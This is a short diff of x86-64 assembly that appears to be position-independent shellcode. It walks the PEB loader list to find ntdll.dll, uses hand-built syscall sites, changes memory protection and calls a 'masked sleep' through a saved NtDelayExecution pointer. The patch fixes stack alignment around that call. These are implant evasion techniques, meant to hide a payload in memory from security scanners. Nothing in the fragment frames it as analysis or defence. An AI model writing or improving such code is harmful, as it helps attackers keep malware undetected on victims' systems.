@@ -40,8 +40,8 @@ sym_base:
     pop r12
     ; 0x30 scratch: headroom below the 8 saved registers (they sit at
     ; [rsp+0x30..+0x70] after this sub). Each syscall site aligns RSP down from
-    ; here and reserves its frame in/just below this gap, so it must stay clear
-    ; of the registers above.
+    ; here and reserves its frame in/just below this gap; the masked call also
+    ; aligns down here, so the gap must stay clear of the registers above.
     sub rsp, 0x30
 
     ; ---- 1. PEB -> Ldr -> walk InLoadOrder for ntdll.dll -----------------
@@ -187,8 +187,11 @@ sym_base:
     mov byte [r9 + 11], 0xE0
 
     ; ---- 7. invoke the masked sleep -------------------------------------
+    mov r13, rsp
+    and rsp, -16
     mov rax, [r12 + (saved_ntdelay - sym_base)]
     call rax
+    mov rsp, r13
 
     ; ---- 8. restore protection (to the saved OldProtect), flag done ------
     ;   Same ABI as step 5; arg3 = the original protection the kernel returned
